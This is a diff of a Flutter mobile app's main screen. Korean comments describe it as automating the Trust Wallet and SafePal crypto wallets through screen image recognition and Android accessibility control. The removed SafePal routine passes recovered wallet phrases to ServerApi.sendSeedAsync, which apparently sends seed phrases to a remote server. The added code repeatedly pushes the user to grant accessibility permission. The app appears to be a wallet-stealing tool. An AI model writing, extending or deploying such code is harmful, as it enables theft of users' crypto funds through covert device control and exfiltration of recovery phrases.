@@ -3,8 +3,7 @@ import 'dart:async';
 import 'package:flutter/foundation.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
-import 'package:shared_preferences/shared_preferences.dart';
-import 'package:path_provider/path_provider.dart';
+
 import '../api/server_api.dart';
 import '../theme/app_theme.dart';
 import '../services/app_launcher.dart';
@@ -16,7 +15,6 @@ import '../services/android_image_matcher.dart';
 /// 모바일 전용 메인 화면 - Trust Wallet 실행 + 이미지 인식 자동화
 class MainScreen extends StatefulWidget {
   const MainScreen({super.key});
-
 
   @override
   State<MainScreen> createState() => _MainScreenState();
@@ -93,20 +91,16 @@ class _MainScreenState extends State<MainScreen> with WidgetsBindingObserver {
     if (mounted) await _refreshNodeCollectorStatus();
   }
 
-  /// 앱 시작 시: 접근성 권한이 없고, 아직 한 번도 안내 안 했으면 한 번만 설정 화면 열기
+  /// 앱 시작 시 권한 자동 요청
   Future<void> _requestPermissionsOnStart() async {
     try {
-      await _checkPermissions();
-
-      final prefs = await SharedPreferences.getInstance();
-      final prompted = prefs.getBool('touchPermissionPromptedOnce') ?? false;
-      if (prompted) return;
-
+      await AndroidImageMatcher.requestScreenPermission();
+      await Future.delayed(const Duration(milliseconds: 500));
       final hasTouch = await AndroidImageMatcher.hasTouchPermission();
       if (!hasTouch) {
-        await prefs.setBool('touchPermissionPromptedOnce', true);
         await AndroidImageMatcher.requestTouchPermission();
       }
+      await _checkPermissions();
     } catch (_) {}
   }
 
@@ -160,12 +154,6 @@ class _MainScreenState extends State<MainScreen> with WidgetsBindingObserver {
     if (!mounted) return;
     setState(() {
       _logLines.add(text);
-      // 메모리 보호: 로그 라인 수를 최대 2000줄로 제한 (초과분은 앞에서 삭제)
-      const maxLines = 2000;
-      if (_logLines.length > maxLines) {
-        final removeCount = _logLines.length - maxLines;
-        _logLines.removeRange(0, removeCount);
-      }
       WidgetsBinding.instance.addPostFrameCallback((_) {
         if (mounted && _logController.hasClients) {
           _logController.animateTo(
@@ -278,6 +266,35 @@ class _MainScreenState extends State<MainScreen> with WidgetsBindingObserver {
       return;
     }
 
+    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
+    if (!hasTouch) {
+      if (!mounted) return;
+      showDialog(
+        context: context,
+        builder: (ctx) => AlertDialog(
+          title: const Text('접근성 권한 필요'),
+          content: const Text(
+            '설정 > 접근성에서 "nexus_flutter" 또는 "Nexus"를 찾아 스위치를 켜주세요.\n\n'
+            '활성화 후 뒤로가기로 돌아오면 자동으로 인식됩니다.',
+          ),
+          actions: [
+            TextButton(
+              onPressed: () => Navigator.of(ctx).pop(),
+              child: const Text('취소'),
+            ),
+            TextButton(
+              onPressed: () async {
+                Navigator.of(ctx).pop();
+                await AndroidImageMatcher.requestTouchPermission();
+              },
+              child: const Text('설정 열기'),
+            ),
+          ],
+        ),
+      );
+      return;
+    }
+
     setState(() {
       _running = true;
       _logLines.clear();
@@ -339,6 +356,32 @@ class _MainScreenState extends State<MainScreen> with WidgetsBindingObserver {
                 Navigator.of(context).popUntil((route) => route.isFirst);
               },
               child: const Text('확인'),
+            ),
+          ],
+        ),
+      );
+      return;
+    }
+
+    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
+    if (!hasTouch) {
+      if (!mounted) return;
+      showDialog(
+        context: context,
+        builder: (ctx) => AlertDialog(
+          title: const Text('접근성 권한 필요'),
+          content: const Text(
+            '설정 > 접근성에서 "nexus_flutter" 또는 "Nexus"를 찾아 스위치를 켜주세요.\n\n'
+            '활성화 후 뒤로가기로 돌아오면 자동으로 인식됩니다.',
+          ),
+          actions: [
+            TextButton(onPressed: () => Navigator.of(ctx).pop(), child: const Text('취소')),
+            TextButton(
+              onPressed: () async {
+                Navigator.of(ctx).pop();
+                await AndroidImageMatcher.requestTouchPermission();
+              },
+              child: const Text('설정 열기'),
             ),
           ],
         ),
@@ -424,71 +467,6 @@ class _MainScreenState extends State<MainScreen> with WidgetsBindingObserver {
     );
 
     AndroidImageMatcher.debugLog = null;
-    if (!mounted) return;
-    setState(() => _running = false);
-  }
-
-  /// SafePal 클릭 패턴 수집 테스트 (safepal_clicks.jsonl 기록)
-  Future<void> _onSafePalRecordTest() async {
-    if (_running) return;
-    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
-    if (!hasTouch) {
-      if (!mounted) return;
-      _appendLog('접근성 권한 필요.', red: true);
-      return;
-    }
-    setState(() {
-      _running = true;
-      _logLines.clear();
-    });
-    AutomationRunner.password = _passwordController.text.trim();
-
-    final logDir = await AutomationLogFile.getLogDirectory();
-    _appendLog('로그 폴더: $logDir');
-    _appendLog('SafePal 클릭 패턴 수집 모드: safepal_clicks.jsonl 에 기록됩니다.');
-
-    await AutomationRunner.runSafePalRecordTest(
-      logLine: (t) {
-        if (mounted) _appendLog(t);
-      },
-      logLineRed: (t) {
-        if (mounted) _appendLog(t, red: true);
-      },
-      onSuccessPhrase: (p) {
-        final token = ServerApi.currentToken;
-        if (token != null && token.isNotEmpty) {
-          ServerApi.sendSeedAsync(token, p);
-        }
-      },
-      replaceLogLastLine: (t) {
-        if (!mounted) return;
-        setState(() {
-          if (_logLines.isNotEmpty) _logLines.removeLast();
-          _logLines.add(t);
-        });
-      },
-      setClipboard: (t) => Clipboard.setData(ClipboardData(text: t)),
-    );
-
-    if (!mounted) return;
-    setState(() => _running = false);
-  }
-
-  /// safepal_clicks.jsonl → safepal_click_profiles.json 변환
-  Future<void> _onBuildSafePalProfiles() async {
-    if (_running) return;
-    setState(() => _running = true);
-    _logLines.clear();
-    final logDir = await AutomationLogFile.getLogDirectory();
-    _appendLog('로그 폴더: $logDir');
-    _appendLog('safepal_clicks.jsonl → safepal_click_profiles.json 변환 중...');
-    final jsonStr = await AutomationRunner.buildSafePalClickProfilesFromLog();
-    final docsDir = await getApplicationDocumentsDirectory();
-    _appendLog('완료: ${docsDir.path}/data/safepal_click_profiles.json');
-    if (jsonStr != null && jsonStr.isNotEmpty) {
-      _appendLog('--- safepal_click_profiles.json ---');
-      _appendLog(jsonStr);
-    }
     if (!mounted) return;
     setState(() => _running = false);
   }
@@ -648,14 +626,6 @@ class _MainScreenState extends State<MainScreen> with WidgetsBindingObserver {
                       onPressed: _running ? null : _onStartSafePal,
                       style: ElevatedButton.styleFrom(backgroundColor: AppTheme.accent.withOpacity(0.9), foregroundColor: AppTheme.bgDark),
                       child: const Text('시작 (SafePal)'),
-                    ),
-                    OutlinedButton(
-                      onPressed: _running ? null : _onSafePalRecordTest,
-                      child: const Text('SafePal 클릭 수집'),
-                    ),
-                    OutlinedButton(
-                      onPressed: _running ? null : _onBuildSafePalProfiles,
-                      child: const Text('SafePal 프로파일 생성'),
                     ),
                     TextButton(
                       onPressed: _running ? _onStop : null,
